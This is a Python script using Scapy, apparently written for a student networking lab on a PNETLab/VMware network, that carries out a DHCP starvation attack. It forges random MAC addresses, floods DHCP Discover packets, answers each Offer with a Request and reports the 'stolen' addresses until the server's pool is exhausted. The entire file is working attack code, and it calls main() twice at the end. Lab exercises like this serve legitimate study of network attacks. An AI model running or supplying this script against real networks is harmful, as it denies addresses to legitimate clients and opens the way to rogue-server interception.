#!/usr/bin/env python3
"""
SCRIPT: dhcp_starvation_20241165.py
AUTOR: Matrícula 20241165
RED: 20.24.116.0/24
SERVIDOR DHCP: 20.24.116.4
"""

from scapy.all import *
import random
import time
from threading import Thread
import sys
import os

# Colores para output
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BLUE = '\033[94m'
END = '\033[0m'

# Configuración global de Scapy
conf.checkIPaddr = False

class DHCPStarvation:
    def __init__(self, interface='eth0'):
        self.interface = interface
        self.used_macs = []
        self.stolen_ips = []
        self.dhcp_server = "20.24.116.4"
        self.stats = {
            'discover': 0,
            'offer': 0,
            'request': 0,
            'ack': 0
        }
        
    def generar_mac(self):
        """Genera MAC aleatoria para VMWare/PNELAB"""
        mac = [0x00, 0x0c, 0x29,
               random.randint(0x00, 0x7f),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        return ':'.join(map(lambda x: f"{x:02x}", mac))
    
    def mac_a_bytes(self, mac):
        """Convierte MAC string a bytes"""
        return bytes.fromhex(mac.replace(':', ''))
    
    def crear_discover(self, mac):
        """Crea paquete DHCP Discover"""
        xid = random.randint(1, 1000000)
        discover = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                   IP(src="0.0.0.0", dst="255.255.255.255") /
                   UDP(sport=68, dport=67) /
                   BOOTP(chaddr=self.mac_a_bytes(mac), xid=xid) /
                   DHCP(options=[("message-type", "discover"),
                                ("param_req_list", [1, 3, 6]),
                                "end"]))
        return discover, xid
    
    def crear_request(self, mac, ip_ofrecida, ip_servidor, xid):
        """Crea paquete DHCP Request"""
        request = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                  IP(src="0.0.0.0", dst="255.255.255.255") /
                  UDP(sport=68, dport=67) /
                  BOOTP(chaddr=self.mac_a_bytes(mac), xid=xid) /
                  DHCP(options=[("message-type", "request"),
                               ("server_id", ip_servidor),
                               ("requested_addr", ip_ofrecida),
                               "end"]))
        return request
    
    def manejar_offer(self, pkt):
        """Procesa DHCP Offer"""
        if DHCP in pkt and pkt[DHCP].options[0][1] == 2:  # Offer
            ip_ofrecida = pkt[BOOTP].yiaddr
            ip_servidor = pkt[IP].src
            mac_cliente = pkt[Ether].dst
            xid = pkt[BOOTP].xid
            
            if mac_cliente in self.used_macs:
                self.stats['offer'] += 1
                self.stolen_ips.append(ip_ofrecida)
                
                print(f"{GREEN}[+] OFFER #{self.stats['offer']}{END}")
                print(f"    MAC: {mac_cliente}")
                print(f"    IP: {ip_ofrecida}")
                print(f"    Servidor: {ip_servidor}")
                
                # Enviar Request inmediatamente
                request_pkt = self.crear_request(mac_cliente, ip_ofrecida, ip_servidor, xid)
                sendp(request_pkt, iface=self.interface, verbose=0)
                self.stats['request'] += 1
                print(f"{RED}[!] IP ROBADA: {ip_ofrecida}{END}")
                
    def atacar(self, num_peticiones=250):
        """Ejecuta el ataque de starvation"""
        print(f"{BLUE}{'='*60}{END}")
        print(f"{BLUE}DHCP STARVATION ATTACK - MATRÍCULA 20241165{END}")
        print(f"{BLUE}{'='*60}{END}")
        print(f"{YELLOW}[*] Interfaz: {self.interface}{END}")
        print(f"{YELLOW}[*] Servidor DHCP objetivo: {self.dhcp_server}{END}")
        print(f"{YELLOW}[*] Peticiones a enviar: {num_peticiones}{END}")
        print(f"{YELLOW}[*] Pool DHCP: 20.24.116.0/24{END}")
        print(f"{BLUE}{'='*60}{END}\n")
        
        # Hilo para capturar DHCP Offers
        def capturar_offers():
            sniff(iface=self.interface,
                  prn=self.manejar_offer,
                  filter="udp and port 67",
                  store=0)
        
        t = Thread(target=capturar_offers)
        t.daemon = True
        t.start()
        
        # Enviar DHCP Discover masivos
        try:
            for i in range(num_peticiones):
                # Generar MAC única
                mac = self.generar_mac()
                while mac in self.used_macs:
                    mac = self.generar_mac()
                self.used_macs.append(mac)
                
                # Enviar DHCP Discover
                discover_pkt, xid = self.crear_discover(mac)
                sendp(discover_pkt, iface=self.interface, verbose=0)
                self.stats['discover'] += 1
                
                # Mostrar progreso
                if (i + 1) % 20 == 0:
                    print(f"{BLUE}[*] Progreso: {i+1}/{num_peticiones}{END}")
                    print(f"    - DHCP Discover enviados: {self.stats['discover']}")
                    print(f"    - DHCP Offers recibidos: {self.stats['offer']}")
                    print(f"    - IPs robadas: {len(self.stolen_ips)}")
                    print(f"    - MACs usadas: {len(self.used_macs)}")
                
                time.sleep(0.02)  # 20ms entre peticiones
                
        except KeyboardInterrupt:
            print(f"\n{RED}[!] Ataque detenido por el usuario{END}")
        except Exception as e:
            print(f"{RED}[-] Error: {e}{END}")
        
        # Mostrar resultados finales
        self.mostrar_resultados()
    
    def mostrar_resultados(self):
        """Muestra estadísticas finales del ataque"""
        print(f"\n{BLUE}{'='*60}{END}")
        print(f"{BLUE}RESULTADOS FINALES DEL ATAQUE{END}")
        print(f"{BLUE}{'='*60}{END}")
        print(f"{YELLOW}[*] DHCP Discover enviados: {self.stats['discover']}{END}")
        print(f"{YELLOW}[*] DHCP Offers recibidos: {self.stats['offer']}{END}")
        print(f"{YELLOW}[*] DHCP Requests enviados: {self.stats['request']}{END}")
        print(f"{YELLOW}[*] Total IPs robadas: {len(self.stolen_ips)}{END}")
        print(f"{YELLOW}[*] Total MACs usadas: {len(self.used_macs)}{END}")
        
        if self.stolen_ips:
            print(f"\n{GREEN}Primeras 20 IPs robadas:{END}")
            for i, ip in enumerate(self.stolen_ips[:20], 1):
                print(f"  {i:2d}. {ip}")
            
            # Mostrar rango de IPs robadas
            ips_numeros = [int(ip.split('.')[3]) for ip in self.stolen_ips]
            if ips_numeros:
                print(f"\n{GREEN}Rango de IPs robadas:{END}")
                print(f"  Desde: 20.24.116.{min(ips_numeros)}")
                print(f"  Hasta: 20.24.116.{max(ips_numeros)}")
        
        print(f"{BLUE}{'='*60}{END}")

def main():
    """Función principal"""
    # Verificar permisos de root
    if os.geteuid() != 0:
        print(f"{RED}[-] Este script requiere permisos de root!{END}")
        print(f"{YELLOW}[*] Ejecuta: sudo python3 {sys.argv[0]}{END}")
        sys.exit(1)
    
    # Verificar interfaz
    interface = "eth0"
    try:
        get_if_hwaddr(interface)
    except:
        print(f"{RED}[-] Interfaz {interface} no encontrada{END}")
        print(f"{YELLOW}[*] Interfaces disponibles:{END}")
        os.system("ip link show | grep -E '^[0-9]+' | cut -d: -f2")
        sys.exit(1)
    
    # Iniciar ataque
    atacante = DHCPStarvation(interface=interface)
    atacante.atacar(num_peticiones=254)  # Agotar todo el pool

if __name__ == "__main__":
    main()
    main()
